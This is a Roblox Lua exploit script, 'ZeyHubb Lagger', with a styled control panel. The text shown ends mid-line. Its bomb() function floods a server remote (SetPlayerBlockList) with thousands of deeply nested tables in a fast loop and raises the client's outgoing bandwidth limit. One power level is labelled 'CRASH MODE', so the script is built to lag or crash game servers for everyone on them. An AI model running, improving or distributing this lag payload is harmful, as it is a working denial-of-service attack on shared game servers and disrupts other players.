local Players = game:GetService("Players") local UserInputService = game:GetService("UserInputService") local TweenService = game:GetService("TweenService") local CoreGui = game:GetService("CoreGui") local HttpService = game:GetService("HttpService") local RunService = game:GetService("RunService") local player = Players.LocalPlayer local ConfigFile = "CleanDuelsConfig.json" local NIVELES = { V1 = { poder = 20, texto = "MODE SPEED 50-25", color = Color3.fromRGB(255, 45, 45) }, V2 = { poder = 25, texto = "MODE SPEED 45-23", color = Color3.fromRGB(255, 25, 25) }, V3 = { poder = 32, texto = "MODE SPEED 40-17", color = Color3.fromRGB(255, 0, 0) }, V4 = { poder = 70, texto = "CRASH MODE", color = Color3.fromRGB(180, 20, 20) } } local keybind = Enum.KeyCode.M local listeningForInput = false local laggerActive = false local lagThread = nil local nivelActual = "V1" local ventanaBloqueada = false local UI_CONFIG = { MainBg = Color3.fromRGB(5, 0, 0), TitleColor = Color3.fromRGB(255, 45, 45), TextColor = Color3.fromRGB(235, 210, 210), ButtonInact = Color3.fromRGB(35, 8, 8), ButtonV1 = Color3.fromRGB(255, 45, 45), ButtonV2 = Color3.fromRGB(255, 35, 35), ButtonV3 = Color3.fromRGB(255, 0, 0), ButtonV4 = Color3.fromRGB(180, 20, 20), ToggleOff = Color3.fromRGB(30, 5, 5), ToggleOn = Color3.fromRGB(0, 200, 0), LockColor = Color3.fromRGB(255, 90, 90), UnlockColor = Color3.fromRGB(190, 70, 70), Font = Enum.Font.GothamBlack, BorderColor = Color3.fromRGB(110, 15, 15), GlowColor = Color3.fromRGB(255, 25, 25), SelectorBg = Color3.fromRGB(35, 7, 7), SelectorAct = Color3.fromRGB(255, 35, 35), OrangeBorder = Color3.fromRGB(170, 20, 20), CornerRadius = 10, PanelWidth = 260, PanelHeight = 130, BarHeight = 32, } local function SaveConfig() local data = { Keybind = keybind.Name, Nivel = nivelActual, Bloqueado = ventanaBloqueada } pcall(function() writefile(ConfigFile, HttpService:JSONEncode(data)) end) end local function LoadConfig() if pcall(isfile, ConfigFile) and isfile(ConfigFile) then pcall(function() local data = HttpService:JSONDecode(readfile(ConfigFile)) keybind = Enum.KeyCode[data.Keybind] or Enum.KeyCode.M nivelActual = data.Nivel or "V1" ventanaBloqueada = data.Bloqueado or false end) end end LoadConfig() local function bomb(poder) local main, spam = {}, {{}} local z = spam[1] for i = 1, 25 do local t = {} table.insert(z, t) z = t end local max = math.min(12000, poder * 50) for i = 1, max do table.insert(main, spam) end pcall(function() game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main) end) end local toggleBall, toggleContainer, btnV1, btnV2, btnV3, btnV4, lockButton local titleLabel, textLagger, keybindButton, toggleClick, shadowLabel, shadowGradient local mainFrame, screenGui, centralContainer, headerFrame local minimizeButton, expandButton local expanded = true local modeTextLabel local warningFrame = nil local warningActive = false local function actualizarBotonesNivel() if nivelActual == "V1" then btnV1.TextColor3 = UI_CONFIG.ButtonV1 btnV1.BackgroundColor3 = Color3.fromRGB(60, 60, 70) btnV1.BorderSizePixel = 1 btnV1.BorderColor3 = UI_CONFIG.ButtonV1 else btnV1.TextColor3 = Color3.fromRGB(150, 150, 160) btnV1.BackgroundColor3 = Color3.fromRGB(60, 60, 70) btnV1.BorderSizePixel = 1 btnV1.BorderColor3 = Color3.fromRGB(80, 80, 90) end if nivelActual == "V2" then btnV2.TextColor3 = UI_CONFIG.ButtonV2 btnV2.BackgroundColor3 = Color3.fromRGB(60, 60, 70) btnV2.BorderSizePixel = 1 btnV2.BorderColor3 = UI_CONFIG.ButtonV2 else btnV2.TextColor3 = Color3.fromRGB(150, 150, 160) btnV2.BackgroundColor3 = Color3.fromRGB(60, 60, 70) btnV2.BorderSizePixel = 1 btnV2.BorderColor3 = Color3.fromRGB(80, 80, 90) end if nivelActual == "V3" then btnV3.TextColor3 = UI_CONFIG.ButtonV3 btnV3.BackgroundColor3 = Color3.fromRGB(60, 60, 70) btnV3.BorderSizePixel = 1 btnV3.BorderColor3 = UI_CONFIG.ButtonV3 else btnV3.TextColor3 = Color3.fromRGB(150, 150, 160) btnV3.BackgroundColor3 = Color3.fromRGB(60, 60, 70) btnV3.BorderSizePixel = 1 btnV3.BorderColor3 = Color3.fromRGB(80, 80, 90) end if nivelActual == "V4" then btnV4.TextColor3 = UI_CONFIG.ButtonV4 btnV4.BackgroundColor3 = Color3.fromRGB(60, 60, 70) btnV4.BorderSizePixel = 1 btnV4.BorderColor3 = UI_CONFIG.ButtonV4 else btnV4.TextColor3 = Color3.fromRGB(150, 150, 160) btnV4.BackgroundColor3 = Color3.fromRGB(60, 60, 70) btnV4.BorderSizePixel = 1 btnV4.BorderColor3 = Color3.fromRGB(80, 80, 90) end if modeTextLabel then local info = NIVELES[nivelActual] modeTextLabel.Text = info.texto modeTextLabel.TextColor3 = info.color end end local function actualizarSwitch() if toggleContainer then toggleContainer.BackgroundColor3 = UI_CONFIG.ToggleOff end if toggleBall then toggleBall.BackgroundColor3 = UI_CONFIG.ToggleOff if laggerActive then toggleBall.Position = UDim2.new(1, -18, 0.5, -9) else toggleBall.Position = UDim2.new(0, 3, 0.5, -9) end end if toggleClick then toggleClick.Text = laggerActive and "ACTIVE" or "INACTIVE" if laggerActive then toggleClick.TextColor3 = Color3.fromRGB(255, 45, 45) else toggleClick.TextColor3 = Color3.fromRGB(255, 0, 0) end end end local function actualizarCandado() lockButton.Text = ventanaBloqueada and "Lock" or "Unlock" lockButton.TextColor3 = ventanaBloqueada and Color3.fromRGB(200, 200, 220) or Color3.fromRGB(150, 150, 170) end local function actualizarKeybindButton() if keybindButton then local display = keybind.Name if display:match("Button") then display = display:gsub("Button", "") end keybindButton.Text = "KEY: " .. display end end local function toggleLagger() laggerActive = not laggerActive local targetPos = laggerActive and UDim2.new(1, -18, 0.5, -9) or UDim2.new(0, 3, 0.5, -9) TweenService:Create(toggleBall, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = targetPos }):Play() toggleClick.Text = laggerActive and "ACTIVE" or "INACTIVE" if laggerActive then toggleClick.TextColor3 = Color3.fromRGB(255, 45, 45) else toggleClick.TextColor3 = Color3.fromRGB(255, 0, 0) end if laggerActive then if lagThread then task.cancel(lagThread) end lagThread = task.spawn(function() while laggerActive do pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end) bomb(NIVELES[nivelActual].poder) task.wait(0.18) end end) else if lagThread then task.cancel(lagThread); lagThread = nil end end end local function showWarning(callback) if warningActive then return end warningActive = true local popup = Instance.new("Frame", screenGui) popup.Name = "WarningPopup" popup.BackgroundColor3 = Color3.fromRGB(30, 30, 47) popup.BorderSizePixel = 2 popup.BorderColor3 = Color3.fromRGB(90, 125, 156) popup.Size = UDim2.new(0, 280, 0, 170) popup.Position = UDim2.new(0.5, -140, 0.5, -110) popup.ZIndex = 100 local popupCorner = Instance.new("UICorner", popup) popupCorner.CornerRadius = UDim.new(0, 12) local gradient = Instance.new("UIGradient", popup) gradient.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 47)), ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 35)) }) gradient.Rotation = 45 local stroke = Instance.new("UIStroke", popup) stroke.Color = Color3.fromRGB(150, 200, 255) stroke.Thickness = 1 stroke.Transparency = 0.7 local warnText = Instance.new("TextLabel", popup) warnText.Name = "WarnText" warnText.BackgroundTransparency = 1 warnText.Size = UDim2.new(1, -20, 0.6, -10) warnText.Position = UDim2.new(0, 10, 0, 10) warnText.Font = Enum.Font.GothamMedium warnText.Text = [[âš ï¸ This mode can overheat your device if it is mid-range to high-end devices. This mode is the best to use. Medium-range devices may have problems with ping or lag.]] warnText.TextColor3 = Color3.fromRGB(255, 255, 255) warnText.TextSize = 12 warnText.TextWrapped = true warnText.TextXAlignment = Enum.TextXAlignment.Center warnText.TextYAlignment = Enum.TextYAlignment.Top warnText.ZIndex = 101 local textStroke = Instance.new("UIStroke", warnText) textStroke.Color = Color3.fromRGB(0, 0, 0) textStroke.Thickness = 1 textStroke.Transparency = 0.5 local yesBtn = Instance.new("TextButton", popup) yesBtn.Name = "YesBtn" yesBtn.BackgroundColor3 = Color3.fromRGB(255, 30, 30) yesBtn.BorderSizePixel = 0 yesBtn.Size = UDim2.new(0, 70, 0, 26) yesBtn.Position = UDim2.new(0.5, -80, 1, -34) yesBtn.Font = Enum.Font.GothamBlack yesBtn.Text = "YES" yesBtn.TextColor3 = Color3.fromRGB(255, 255, 255) yesBtn.TextSize = 14 yesBtn.ZIndex = 101 local yesCorner = Instance.new("UICorner", yesBtn) yesCorner.CornerRadius = UDim.new(0, 8) yesBtn.MouseButton1Click:Connect(function() warningActive = false popup:Destroy() callback(true) end) yesBtn.MouseEnter:Connect(function() yesBtn.BackgroundColor3 = Color3.fromRGB(255, 70, 70) end) yesBtn.MouseLeave:Connect(function() yesBtn.BackgroundColor3 = Color3.fromRGB(255, 30, 30) end) local noBtn = Instance.new("TextButton", popup) noBtn.Name = "NoBtn" noBtn.BackgroundColor3 = Color3.fromRGB(180, 10, 10) noBtn.BorderSizePixel = 0 noBtn.Size = UDim2.new(0, 70, 0, 26) noBtn.Position = UDim2.new(0.5, 10, 1, -34) noBtn.Font = Enum.Font.GothamBlack noBtn.Text = "NO" noBtn.TextColor3 = Color3.fromRGB(255, 255, 255) noBtn.TextSize = 14 noBtn.ZIndex = 101 local noCorner = Instance.new("UICorner", noBtn) noCorner.CornerRadius = UDim.new(0, 8) noBtn.MouseButton1Click:Connect(function() warningActive = false popup:Destroy() callback(false) end) noBtn.MouseEnter:Connect(function() noBtn.BackgroundColor3 = Color3.fromRGB(230, 35, 35) end) noBtn.MouseLeave:Connect(function() noBtn.BackgroundColor3 = Color3.fromRGB(180, 10, 10) end) warningFrame = popup end local function collapseWindow()
    if not expanded then return end
    expanded = false
    centralContainer.Visible = false

    -- Hide the normal FH2ONTOP word and launch many tiny copies in the mini bar.
    local mainBrand = mainFrame:FindFirstChild("FH2ONTOP_Attached")
    if mainBrand then
        mainBrand.Visible = false
    end
    local miniFolder = mainFrame:FindFirstChild("FH2ONTOP_MiniAnimation")
    if miniFolder then
        miniFolder.Visible = true
    end

    local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    TweenService:Create(
        mainFrame,
        tweenInfo,
        { Size = UDim2.new(0, UI_CONFIG.PanelWidth, 0, UI_CONFIG.BarHeight) }
    ):Play()

    task.spawn(function()
        miniFH2ONTOP()
        task.wait(0.35)
        if not expanded then
            miniFH2ONTOP()
        end
    end)
end local function expandWindow()
    if expanded then return end
    expanded = true
    centralContainer.Visible = true
    local miniFolder = mainFrame:FindFirstChild("FH2ONTOP_MiniAnimation")
    if miniFolder then
        miniFolder.Visible = false
        for _, child in ipairs(miniFolder:GetChildren()) do
            child:Destroy()
        end
    end

    local mainBrand = mainFrame:FindFirstChild("FH2ONTOP_Attached")
    if mainBrand then
        mainBrand.Visible = true
    end

    centralContainer.Size = UDim2.new(1, -10, 0, 0)
    local tweenInfo = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    TweenService:Create(
        mainFrame,
        tweenInfo,
        { Size = UDim2.new(0, UI_CONFIG.PanelWidth, 0, UI_CONFIG.PanelHeight) }
    ):Play()
    TweenService:Create(
        centralContainer,
        tweenInfo,
        { Size = UDim2.new(1, -10, 1, -(UI_CONFIG.BarHeight + 6)) }
    ):Play()
end if CoreGui:FindFirstChild("CleanDuels_UI") then CoreGui.CleanDuels_UI:Destroy() end screenGui = Instance.new("ScreenGui") screenGui.Name = "CleanDuels_UI" screenGui.Parent = CoreGui screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling screenGui.ResetOnSpawn = false mainFrame = Instance.new("Frame") mainFrame.Name = "MainFrame" mainFrame.BackgroundColor3 = Color3.fromRGB(8, 0, 0) mainFrame.BackgroundTransparency = 0.2 mainFrame.BorderSizePixel = 2 mainFrame.BorderColor3 = Color3.fromRGB(125, 15, 15) mainFrame.Size = UDim2.new(0, UI_CONFIG.PanelWidth, 0, UI_CONFIG.PanelHeight) mainFrame.Position = UDim2.new(0.15, 0, 0.5, -UI_CONFIG.PanelHeight/2) mainFrame.Parent = screenGui mainFrame.ClipsDescendants = true local mainCorner = Instance.new("UICorner", mainFrame) mainCorner.CornerRadius = UDim.new(0, UI_CONFIG.CornerRadius) local backgroundImage = Instance.new("ImageLabel", mainFrame) backgroundImage.Name = "BackgroundImage" backgroundImage.Size = UDim2.new(1.5, 0, 1.5, 0) backgroundImage.Position = UDim2.new(-0.25, 0, -0.25, 0) backgroundImage.Image = "rbxassetid://113377863174917" backgroundImage.BackgroundTransparency = 1 backgroundImage.ZIndex = 0 backgroundImage.ScaleType = Enum.ScaleType.Slice local imgCorner = Instance.new("UICorner", backgroundImage) imgCorner.CornerRadius = UDim.new(0, UI_CONFIG.CornerRadius) headerFrame = Instance.new("Frame", mainFrame) headerFrame.Name = "HeaderFrame" headerFrame.BackgroundColor3 = Color3.fromRGB(10, 0, 0) headerFrame.BackgroundTransparency = 0.5 headerFrame.BorderSizePixel = 0 headerFrame.Size = UDim2.new(1, 0, 0, UI_CONFIG.BarHeight) headerFrame.Position = UDim2.new(0, 0, 0, 0) headerFrame.ZIndex = 2 local headerCorner = Instance.new("UICorner", headerFrame) headerCorner.CornerRadius = UDim.new(0, UI_CONFIG.CornerRadius) titleLabel = Instance.new("TextLabel", headerFrame) titleLabel.BackgroundTransparency = 1 titleLabel.Position = UDim2.new(0, 5, 0, 0) titleLabel.Size = UDim2.new(0, 105, 0, UI_CONFIG.BarHeight) titleLabel.Font = Enum.Font.GothamBlack titleLabel.Text = "ZeyHubb Lagger" titleLabel.TextColor3 = Color3.fromRGB(255, 35, 35) titleLabel.TextSize = 11 titleLabel.TextXAlignment = Enum.TextXAlignment.Left titleLabel.TextYAlignment = Enum.TextYAlignment.Center titleLabel.ZIndex = 3 titleLabel.ClipsDescendants = false shadowLabel = Instance.new("TextLabel", headerFrame) shadowLabel.BackgroundTransparency = 1 shadowLabel.Position = UDim2.new(0, 5, 0, 0) shadowLabel.Size = UDim2.new(0, 105, 0, UI_CONFIG.BarHeight) shadowLabel.Font = Enum.Font.GothamBlack shadowLabel.Text = "ZeyHubb Lagger" shadowLabel.TextSize = 11 shadowLabel.TextXAlignment = Enum.TextXAlignment.Left shadowLabel.TextYAlignment = Enum.TextYAlignment.Center shadowLabel.ZIndex = 4 shadowLabel.ClipsDescendants = true shadowLabel.TextTransparency = 0 shadowLabel.TextColor3 = Color3.fromRGB(255, 80, 80) shadowGradient = Instance.new("UIGradient", shadowLabel) shadowGradient.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(200, 200, 200)), ColorSequenceKeypoint.new(0.2, Color3.fromRGB(220, 220, 220)), ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.6, Color3.fromRGB(220, 220, 220)), ColorSequenceKeypoint.new(0.8, Color3.fromRGB(200, 200, 200)), ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 180, 180)) }) shadowGradient.Rotation = 0 task.spawn(function() while true do for i = 0, 1, 0.006 do shadowGradient.Offset = Vector2.new(i, 0) task.wait(0.025) end end end) 
-- Small animated red water drops falling in the header.
local rainFolder = Instance.new("Frame", headerFrame)
rainFolder.Name = "RedWaterDrops"
rainFolder.BackgroundTransparency = 1
rainFolder.Size = UDim2.new(0, 102, 1, 0)
rainFolder.Position = UDim2.new(0, 0, 0, 0)
rainFolder.ClipsDescendants = true
rainFolder.ZIndex = 6

task.spawn(function()
    local rng = Random.new()
    while rainFolder.Parent do
        local drop = Instance.new("Frame", rainFolder)
        drop.Name = "Drop"
        drop.Size = UDim2.new(0, rng:NextInteger(2, 3), 0, rng:NextInteger(8, 15))
        drop.Position = UDim2.new(0, rng:NextInteger(4, 100), 0, -10)
        if rng:NextNumber() < 0.5 then
            drop.BackgroundColor3 = Color3.fromRGB(255, rng:NextInteger(20, 70), rng:NextInteger(20, 70))
        else
            drop.BackgroundColor3 = Color3.fromRGB(rng:NextInteger(0, 18), rng:NextInteger(0, 4), rng:NextInteger(0, 4))
        end
        drop.BackgroundTransparency = rng:NextNumber(0.02, 0.15)
        drop.BorderSizePixel = 0
        drop.Rotation = rng:NextInteger(-8, 8)
        drop.ZIndex = 6

        local corner = Instance.new("UICorner", drop)
        corner.CornerRadius = UDim.new(1, 0)

        local fallTime = rng:NextNumber(0.4, 0.85)
        local drift = rng:NextInteger(-5, 5)
        local tween = TweenService:Create(
            drop,
            TweenInfo.new(fallTime, Enum.EasingStyle.Linear),
            {
                Position = UDim2.new(0, drop.Position.X.Offset + drift, 0, UI_CONFIG.BarHeight + 8),
                BackgroundTransparency = 1
            }
        )
        tween:Play()
        tween.Completed:Connect(function()
            if drop then drop:Destroy() end
        end)

        task.wait(rng:NextNumber(0.035, 0.08))
    end
end)

keybindButton = Instance.new("TextButton", headerFrame) keybindButton.BackgroundColor3 = Color3.fromRGB(25, 25, 30) keybindButton.BackgroundTransparency = 0.3 keybindButton.Position = UDim2.new(1, -140, 0.5, -8) keybindButton.Size = UDim2.new(0, 42, 0, 16) keybindButton.Font = Enum.Font.GothamBlack keybindButton.Text = "KEY: M" keybindButton.TextColor3 = Color3.fromRGB(200, 200, 220) keybindButton.TextSize = 8 keybindButton.AutoButtonColor = false keybindButton.ZIndex = 5 local keyCorner = Instance.new("UICorner", keybindButton) keyCorner.CornerRadius = UDim.new(0, UI_CONFIG.CornerRadius) actualizarKeybindButton() lockButton = Instance.new("TextButton", headerFrame) lockButton.BackgroundTransparency = 0.3 lockButton.BackgroundColor3 = Color3.fromRGB(25, 25, 30) lockButton.Position = UDim2.new(1, -92, 0.5, -8) lockButton.Size = UDim2.new(0, 34, 0, 16) lockButton.Font = Enum.Font.GothamBlack lockButton.TextSize = 8 lockButton.TextColor3 = Color3.fromRGB(200, 200, 220) lockButton.AutoButtonColor = false lockButton.ZIndex = 5 local lockCorner = Instance.new("UICorner", lockButton) lockCorner.CornerRadius = UDim.new(0, UI_CONFIG.CornerRadius) lockButton.MouseButton1Click:Connect(function() ventanaBloqueada = not ventanaBloqueada actualizarCandado() SaveConfig() end) actualizarCandado() minimizeButton = Instance.new("TextButton", headerFrame) minimizeButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40) minimizeButton.BackgroundTransparency = 0.5 minimizeButton.Position = UDim2.new(1, -52, 0.5, -9) minimizeButton.Size = UDim2.new(0, 18, 0, 18) minimizeButton.Font = Enum.Font.GothamBlack minimizeButton.Text = "-" minimizeButton.TextColor3 = Color3.fromRGB(200, 200, 220) minimizeButton.TextSize = 14 minimizeButton.AutoButtonColor = false minimizeButton.ZIndex = 5 local minCorner = Instance.new("UICorner", minimizeButton) minCorner.CornerRadius = UDim.new(0, UI_CONFIG.CornerRadius) minimizeButton.MouseButton1Click:Connect(collapseWindow) expandButton = Instance.new("TextButton", headerFrame) expandButton.BackgroundColor3 = Color3.fromRGB(40, 40, 40) expandButton.BackgroundTransparency = 0.5 expandButton.Position = UDim2.new(1, -28, 0.5, -9) expandButton.Size = UDim2.new(0, 18, 0, 18) expandButton.Font = Enum.Font.GothamBlack expandButton.Text = "+" expandButton.TextColor3 = Color3.fromRGB(255, 45, 45) expandButton.TextSize = 14 expandButton.AutoButtonColor = false expandButton.ZIndex = 5 local expCorner = Instance.new("UICorner", expandButton) expCorner.CornerRadius = UDim.new(0, UI_CONFIG.CornerRadius) expandButton.MouseButton1Click:Connect(expandWindow) 
-- Full UI red/black rain overlay: subtle falling drops across the whole panel.
local rainOverlay = Instance.new("Frame", mainFrame)
rainOverlay.Name = "FullUI_Rain"
rainOverlay.BackgroundTransparency = 1
rainOverlay.Size = UDim2.new(1, 0, 1, 0)
rainOverlay.Position = UDim2.new(0, 0, 0, 0)
rainOverlay.ZIndex = 4
rainOverlay.ClipsDescendants = true
local rainCorner = Instance.new("UICorner", rainOverlay)
rainCorner.CornerRadius = UDim.new(0, UI_CONFIG.CornerRadius)

task.spawn(function()
    local rng = Random.new()
    while rainOverlay.Parent do
        local drop = Instance.new("Frame", rainOverlay)
        drop.Name = "RainDrop"
        local w = rng:NextInteger(2, 3)
        local h = rng:NextInteger(10, 20)
        drop.Size = UDim2.new(0, w, 0, h)
        drop.Position = UDim2.new(0, rng:NextInteger(3, math.max(4, UI_CONFIG.PanelWidth - 4)), 0, -h)
        if rng:NextNumber() < 0.5 then
            drop.BackgroundColor3 = Color3.fromRGB(255, rng:NextInteger(35, 90), rng:NextInteger(35, 90))
        else
            drop.BackgroundColor3 = Color3.fromRGB(rng:NextInteger(0, 35), rng:NextInteger(0, 8), rng:NextInteger(0, 8))
        end
        drop.BackgroundTransparency = rng:NextNumber(0.03, 0.18)
        drop.BorderSizePixel = 0
        drop.Rotation = rng:NextInteger(-10, 10)
        drop.ZIndex = 4

        local c = Instance.new("UICorner", drop)
        c.CornerRadius = UDim.new(1, 0)

        local duration = rng:NextNumber(0.45, 1.0)
        local tween = TweenService:Create(
            drop,
            TweenInfo.new(duration, Enum.EasingStyle.Linear),
            {
                Position = UDim2.new(
                    0,
                    drop.Position.X.Offset + rng:NextInteger(-8, 8),
                    0,
                    UI_CONFIG.PanelHeight + 15
                ),
                BackgroundTransparency = 1
            }
        )
        tween:Play()
        tween.Completed:Connect(function()
            if drop then drop:Destroy() end
        end)

        task.wait(rng:NextNumber(0.025, 0.06))
    end
end)


-- Attached FH2ONTOP branding: one complete word, fixed together.
-- It appears/disappears as a whole, while each letter shines one after another.
local floatingBrand = Instance.new("Frame", mainFrame)
floatingBrand.Name = "FH2ONTOP_Attached"
floatingBrand.BackgroundTransparency = 1
floatingBrand.Size = UDim2.new(0, 96, 0, 22)
floatingBrand.Position = UDim2.new(0.5, -48, 0.5, -11)
floatingBrand.ZIndex = 7
floatingBrand.ClipsDescendants = false

local brandText = "FH2ONTOP"
local brandLetters = {}
local letterWidth = 11

for i = 1, #brandText do
    local lbl = Instance.new("TextLabel", floatingBrand)
    lbl.BackgroundTransparency = 1
    lbl.Size = UDim2.new(0, letterWidth + 1, 0, 22)
    lbl.Position = UDim2.new(0, (i - 1) * letterWidth, 0, 0)
    lbl.Font = Enum.Font.GothamBlack
    lbl.Text = brandText:sub(i, i)
    lbl.TextSize = 12
    lbl.TextColor3 = Color3.fromRGB(255, 35, 35)
    lbl.TextTransparency = 1
    lbl.ZIndex = 7
    lbl.TextXAlignment = Enum.TextXAlignment.Center
    lbl.TextYAlignment = Enum.TextYAlignment.Center

    local stroke = Instance.new("UIStroke", lbl)
    stroke.Color = Color3.fromRGB(255, 120, 120)
    stroke.Thickness = 0.7
    stroke.Transparency = 0.25

    table.insert(brandLetters, lbl)
end

task.spawn(function()
    while floatingBrand.Parent do
        -- The complete FH2ONTOP word appears together.
        for _, lbl in ipairs(brandLetters) do
            lbl.TextTransparency = 0.15
            lbl.TextColor3 = Color3.fromRGB(255, 45, 45)
        end

        -- Shine letter by letter, but the letters stay attached.
        for _, lbl in ipairs(brandLetters) do
            local shine = TweenService:Create(
                lbl,
                TweenInfo.new(0.12, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut),
                {
                    TextColor3 = Color3.fromRGB(255, 255, 255),
                    TextTransparency = 0
                }
            )
            shine:Play()
            shine.Completed:Wait()

            local back = TweenService:Create(
                lbl,
                TweenInfo.new(0.12, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut),
                {
                    TextColor3 = Color3.fromRGB(255, 45, 45),
                    TextTransparency = 0.15
                }
            )
            back:Play()
            task.wait(0.025)
        end

        -- Whole word disappears together.
        local fadeOut = {}
        for _, lbl in ipairs(brandLetters) do
            fadeOut[#fadeOut + 1] = TweenService:Create(
                lbl,
                TweenInfo.new(0.35, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
                {TextTransparency = 1}
            )
        end
        for _, tween in ipairs(fadeOut) do
            tween:Play()
        end
        task.wait(0.45)

        -- Whole word reappears in exactly the same attached position.
        local fadeIn = {}
        for _, lbl in ipairs(brandLetters) do
            fadeIn[#fadeIn + 1] = TweenService:Create(
                lbl,
                TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                {TextTransparency = 0.15}
            )
        end
        for _, tween in ipairs(fadeIn) do
            tween:Play()
        end
        task.wait(0.2)
    end
end)

-- Mini-mode FH2ONTOP animation: many tiny attached words appear, glow, then disappear.
local miniBrandFolder = Instance.new("Frame", mainFrame)
miniBrandFolder.Name = "FH2ONTOP_MiniAnimation"
miniBrandFolder.BackgroundTransparency = 1
miniBrandFolder.Size = UDim2.new(1, 0, 0, UI_CONFIG.BarHeight)
miniBrandFolder.Position = UDim2.new(0, 0, 0, 0)
miniBrandFolder.ZIndex = 8
miniBrandFolder.Visible = false
miniBrandFolder.ClipsDescendants = true

local miniRng = Random.new()
local function miniFH2ONTOP()
    for i = 1, 18 do
        local word = Instance.new("TextLabel", miniBrandFolder)
        word.BackgroundTransparency = 1
        word.Size = UDim2.new(0, 40, 0, 9)
        word.Position = UDim2.new(
            0, miniRng:NextInteger(4, math.max(5, UI_CONFIG.PanelWidth - 52)),
            0, miniRng:NextInteger(2, math.max(3, UI_CONFIG.BarHeight - 10))
        )
        word.Font = Enum.Font.GothamBlack
        word.Text = "FH2ONTOP"
        word.TextSize = miniRng:NextInteger(5, 6)
        word.TextColor3 = Color3.fromRGB(255, 35, 35)
        word.TextTransparency = 1
        word.ZIndex = 8
        word.Rotation = miniRng:NextInteger(-8, 8)

        local stroke = Instance.new("UIStroke", word)
        stroke.Color = Color3.fromRGB(255, 110, 110)
        stroke.Thickness = 0.5
        stroke.Transparency = 0.3

        local target = UDim2.new(
            0, word.Position.X.Offset + miniRng:NextInteger(-8, 8),
            0, word.Position.Y.Offset + miniRng:NextInteger(-2, 3)
        )

        local appear = TweenService:Create(
            word,
            TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
            {TextTransparency = 0.05, Position = target}
        )
        appear:Play()

        task.spawn(function()
            task.wait(miniRng:NextNumber(0.25, 0.7))
            local glow = TweenService:Create(
                word,
                TweenInfo.new(0.12, Enum.EasingStyle.Quad, Enum.EasingDirection.InOut),
                {TextColor3 = Color3.fromRGB(255, 255, 255), TextTransparency = 0}
            )
            glow:Play()
            glow.Completed:Wait()

            local fade = TweenService:Create(
                word,
                TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
                {TextTransparency = 1}
            )
            fade:Play()
            fade.Completed:Wait()

            if word then
                word:Destroy()
            end
        end)

        task.wait(0.035)
    end
end

centralContainer = Instance.new("Frame", mainFrame) centralContainer.Name = "CentralContainer" centralContainer.BackgroundColor3 = Color3.fromRGB(12, 2, 2) centralContainer.BackgroundTransparency = 0.4 centralContainer.BorderSizePixel = 2 centralContainer.BorderColor3 = Color3.fromRGB(180, 20, 20) centralContainer.Size = UDim2.new(1, -10, 1, -(UI_CONFIG.BarHeight + 6)) centralContainer.Position = UDim2.new(0, 5, 0, UI_CONFIG.BarHeight + 2) centralContainer.ZIndex = 1 local containerCorner = Instance.new("UICorner", centralContainer) containerCorner.CornerRadius = UDim.new(0, UI_CONFIG.CornerRadius) local padding = Instance.new("UIPadding", centralContainer) padding.PaddingLeft = UDim.new(0, 8) padding.PaddingRight = UDim.new(0, 8) padding.PaddingTop = UDim.new(0, 8) padding.PaddingBottom = UDim.new(0, 8) textLagger = Instance.new("TextLabel", centralContainer) textLagger.BackgroundTransparency = 1 textLagger.Position = UDim2.new(0, 0, 0, 0) textLagger.Size = UDim2.new(0, 80, 0, 22) textLagger.Font = Enum.Font.GothamBlack textLagger.Text = "POWER" textLagger.TextColor3 = Color3.fromRGB(200, 200, 220) textLagger.TextSize = 13 textLagger.TextXAlignment = Enum.TextXAlignment.Left textLagger.TextYAlignment = Enum.TextYAlignment.Center textLagger.ZIndex = 2 toggleContainer = Instance.new("Frame", centralContainer) toggleContainer.BackgroundColor3 = UI_CONFIG.ToggleOff toggleContainer.Position = UDim2.new(1, -52, 0, 0) toggleContainer.Size = UDim2.new(0, 50, 0, 22) toggleContainer.ZIndex = 2 local toggleCorner = Instance.new("UICorner", toggleContainer) toggleCorner.CornerRadius = UDim.new(1, 0) toggleBall = Instance.new("Frame", toggleContainer) toggleBall.BackgroundColor3 = UI_CONFIG.ToggleOff toggleBall.Size = UDim2.new(0, 18, 0, 18) toggleBall.Position = UDim2.new(0, 3, 0.5, -9) toggleBall.ZIndex = 2 local ballCorner = Instance.new("UICorner", toggleBall) ballCorner.CornerRadius = UDim.new(1, 0) toggleClick = Instance.new("TextButton", toggleContainer) toggleClick.BackgroundTransparency = 0 toggleClick.BackgroundColor3 = Color3.fromRGB(45, 45, 45) toggleClick.Size = UDim2.new(1, 0, 1, 0) toggleClick.ZIndex = 3 toggleClick.Font = Enum.Font.GothamBlack toggleClick.Text = "INACTIVE" toggleClick.TextSize = 8 toggleClick.TextColor3 = Color3.fromRGB(255, 0, 0) toggleClick.TextXAlignment = Enum.TextXAlignment.Center toggleClick.TextYAlignment = Enum.TextYAlignment.Center toggleClick.MouseButton1Click:Connect(toggleLagger) toggleClick.AutoButtonColor = false local clickCorner = Instance.new("UICorner", toggleClick) clickCorner.CornerRadius = UDim.new(1, 0) local btnContainer = Instance.new("Frame", centralContainer) btnContainer.Name = "BtnContainer" btnContainer.BackgroundColor3 = Color3.fromRGB(24, 3, 3) btnContainer.BackgroundTransparency = 0.3 btnContainer.BorderSizePixel = 1 btnContainer.BorderColor3 = Color3.fromRGB(180, 20, 20) btnContainer.Size = UDim2.new(0, 240, 0, 32) btnContainer.Position = UDim2.new(0.5, -120, 